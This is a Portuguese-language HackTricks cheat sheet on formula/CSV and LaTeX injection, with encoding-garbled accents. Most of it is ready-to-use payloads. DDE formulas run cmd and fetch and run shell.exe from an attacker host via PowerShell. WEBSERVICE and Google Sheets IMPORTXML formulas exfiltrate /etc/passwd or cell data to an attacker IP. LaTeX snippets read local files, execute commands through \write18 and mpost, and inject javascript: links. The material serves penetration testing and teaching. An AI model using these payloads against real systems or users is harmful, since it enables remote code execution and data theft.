# Formula/CSV/Doc/LaTeX/GhostScript Injection

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Formula Injection

### Info

Se sua **entrada** est√° sendo **refletida** dentro de **arquivos CSV** (ou qualquer outro arquivo que provavelmente ser√° aberto pelo **Excel**), voc√™ pode ser capaz de colocar **f√≥rmulas** do Excel que ser√£o **executadas** quando o usu√°rio **abrir o arquivo** ou quando o usu√°rio **clicar em algum link** dentro da planilha do excel.

{% hint style="danger" %}
Atualmente, o **Excel alertar√°** (v√°rias vezes) o **usu√°rio quando algo for carregado de fora do Excel** para impedi-lo de a√ß√µes maliciosas. Portanto, um esfor√ßo especial em Engenharia Social deve ser aplicado ao payload final.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlink

**O seguinte exemplo √© muito √∫til para exfiltrar conte√∫do da planilha final do excel e para realizar requisi√ß√µes a locais arbitr√°rios. Mas requer que o usu√°rio clique no link (e aceite os avisos).**

O seguinte exemplo foi retirado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Imagine uma viola√ß√£o de seguran√ßa em um sistema de Gerenciamento de Registros de Estudantes sendo explorada atrav√©s de um ataque de inje√ß√£o CSV. A inten√ß√£o principal do atacante √© comprometer o sistema usado pelos professores para gerenciar os detalhes dos alunos. O m√©todo envolve o atacante injetando um payload malicioso na aplica√ß√£o, especificamente inserindo f√≥rmulas prejudiciais em campos destinados aos detalhes dos alunos. O ataque se desenrola da seguinte forma:

1. **Inje√ß√£o de Payload Malicioso:**
* O atacante envia um formul√°rio de detalhes do aluno, mas inclui uma f√≥rmula comumente usada em planilhas (por exemplo, `=HYPERLINK("<malicious_link>","Clique aqui")`).
* Esta f√≥rmula √© projetada para criar um hyperlink, mas aponta para um servidor malicioso controlado pelo atacante.
2. **Exporta√ß√£o de Dados Comprometidos:**
* Professores, sem saber da viola√ß√£o, usam a funcionalidade da aplica√ß√£o para exportar os dados para um arquivo CSV.
* O arquivo CSV, ao ser aberto, ainda cont√©m o payload malicioso. Este payload aparece como um hyperlink clic√°vel na planilha.
3. **Acionando o Ataque:**
* Um professor clica no hyperlink, acreditando que seja uma parte leg√≠tima dos detalhes do aluno.
* Ao clicar, dados sens√≠veis (potencialmente incluindo detalhes da planilha ou do computador do professor) s√£o transmitidos para o servidor do atacante.
4. **Registro dos Dados:**
* O servidor do atacante recebe e registra os dados sens√≠veis enviados do computador do professor.
* O atacante pode ent√£o usar esses dados para v√°rios prop√≥sitos maliciosos, comprometendo ainda mais a privacidade e a seguran√ßa dos alunos e da institui√ß√£o.

### RCE

**Verifique o** [**post original**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **para mais detalhes.**

Em configura√ß√µes espec√≠ficas ou vers√µes mais antigas do Excel, um recurso chamado Dynamic Data Exchange (DDE) pode ser explorado para executar comandos arbitr√°rios. Para aproveitar isso, as seguintes configura√ß√µes devem ser habilitadas:

* Navegue at√© Arquivo ‚Üí Op√ß√µes ‚Üí Central de Confiabilidade ‚Üí Configura√ß√µes da Central de Confiabilidade ‚Üí Conte√∫do Externo, e habilite **Lan√ßamento do Servidor de Troca de Dados Din√¢micos**.

Quando uma planilha com o payload malicioso √© aberta (e se o usu√°rio aceitar os avisos), o payload √© executado. Por exemplo, para iniciar o aplicativo de calculadora, o payload seria:
```markdown
=cmd|' /C calc'!xxx
```
Comandos adicionais tamb√©m podem ser executados, como baixar e executar um arquivo usando PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclus√£o de Arquivo Local (LFI) no LibreOffice Calc

O LibreOffice Calc pode ser usado para ler arquivos locais e exfiltrar dados. Aqui est√£o alguns m√©todos:

* Lendo a primeira linha do arquivo local `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
* Exfiltrando os dados lidos para um servidor controlado pelo atacante: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrando mais de uma linha: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltra√ß√£o DNS (enviando dados lidos como consultas DNS para um servidor DNS controlado pelo atacante): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### Google Sheets para Exfiltra√ß√£o de Dados Fora de Banda (OOB)

O Google Sheets oferece fun√ß√µes que podem ser exploradas para exfiltra√ß√£o de dados OOB:

* **CONCATENATE**: Anexa strings - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: Importa dados de tipos de dados estruturados - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: Importa feeds RSS ou ATOM - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: Importa dados de tabelas ou listas HTML - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: Importa um intervalo de c√©lulas de outra planilha - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: Insere uma imagem em uma c√©lula - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## Inje√ß√£o de LaTeX

Normalmente, os servidores que voc√™ encontrar√° na internet que **convertem c√≥digo LaTeX em PDF** usam **`pdflatex`**.\
Este programa usa 3 atributos principais para (des)permitir a execu√ß√£o de comandos:

* **`--no-shell-escape`**: **Desabilita** o construto `\write18{command}`, mesmo que esteja habilitado no arquivo texmf.cnf.
* **`--shell-restricted`**: Mesmo que `--shell-escape`, mas **limitado** a um conjunto 'seguro' de **comandos** \*\*predefinidos (\*\*No Ubuntu 16.04, a lista est√° em `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** o construto `\write18{command}`. O comando pode ser qualquer comando de shell. Este construto normalmente √© desabilitado por raz√µes de seguran√ßa.

No entanto, existem outras maneiras de executar comandos, ent√£o, para evitar RCE, √© muito importante usar `--shell-restricted`.

### Ler arquivo <a href="#read-file" id="read-file"></a>

Voc√™ pode precisar ajustar a inje√ß√£o com wrappers como \[ ou $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Ler arquivo de linha √∫nica
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Ler arquivo de v√°rias linhas
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Escrever arquivo <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Execu√ß√£o de comandos <a href="#command-execution" id="command-execution"></a>

A entrada do comando ser√° redirecionada para stdin, use um arquivo tempor√°rio para obt√™-la.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Se voc√™ receber algum erro de LaTex, considere usar base64 para obter o resultado sem caracteres inv√°lidos.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**Verifique** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Refer√™ncias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
